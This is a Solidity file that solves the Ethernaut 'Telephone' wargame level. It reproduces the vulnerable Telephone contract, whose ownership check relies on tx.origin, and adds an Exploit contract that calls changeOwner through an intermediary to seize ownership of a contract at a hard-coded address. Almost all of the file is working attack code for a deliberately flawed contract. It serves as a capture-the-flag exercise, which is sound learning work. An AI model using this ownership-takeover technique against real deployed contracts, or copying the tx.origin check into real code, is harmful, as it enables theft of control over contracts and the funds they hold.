pragma solidity ^0.4.18;

// Copy Ethernaut contract =====================================================
contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

// Our contract ================================================================
// To become owner we need the transaction to originate from a different place
// then what msg.sender returns. This is easily done by calling the Telephone
// contract's changeOwner function using another contract
contract Exploit {

  // Whoever deploys this contract should become new owner
  address owner;

  // Create instance of Telephone contract
  Telephone telephoneContract = Telephone(0x7c27d6b839db3c87025b480bbc425d1e29cc2ecc);

  constructor() {
    // Assign owner
    owner = msg.sender;
  }

  // Call changeOwner function with our address as the input
  function becomeOwner() public {
    telephoneContract.changeOwner(owner);
  }

}
